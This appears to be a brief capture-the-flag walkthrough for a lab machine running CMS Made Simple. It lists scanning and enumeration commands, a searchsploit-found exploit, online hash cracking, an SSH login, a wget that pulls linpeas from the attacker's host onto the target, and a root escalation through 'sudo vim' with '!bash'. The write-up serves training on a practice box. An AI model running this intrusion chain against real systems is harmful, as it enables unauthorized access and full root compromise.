| ForMitch.txt - Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!

Steps:-
| Run Nmap to see which ports, services and versions of those services are running.
| Do directory enumeration with gobuster.
| Do a simple searchsploit search of 'CMS Made Simple' OR you can google the vulnerability.
| Now take the exploit written in python, give it proper permissions and execute it! # Gain Username and Password.
| After you get the Password. go to Crackstation or Hashes.com to decrypt it.
| Login into SSH with the Username and Password
| Run "cat user.txt" to get user flag.
| Open python3 server on host machine and import Linpeas onto the Target Machine using wget or curl. # My favorite way to get an overview of any Linux Machine.
| After running "linpeas.sh" you will notice that the user "mitch" can run vim with sudo permissions.
| Run vim ---> Type "!bash" and Voila! You have gained ROOT to the Target Machine!
| Now "cat" the root.txt to get the final flag!
 
Commands:-
| nmap -sS -sC -sV -A -O -T5 -Pn <TARGET_IP>

| ssh mitch@<TARGET_IP> -p 2222
| python3 -m http.server 8000 # Run on Host Machine
| wget http://<HOST_IP>/linpeas.sh #Run on Target Machine
| sudo vim ---> Type "!bash" # You instantly get ROOT
| cat /root/root.txt # Get the final flag
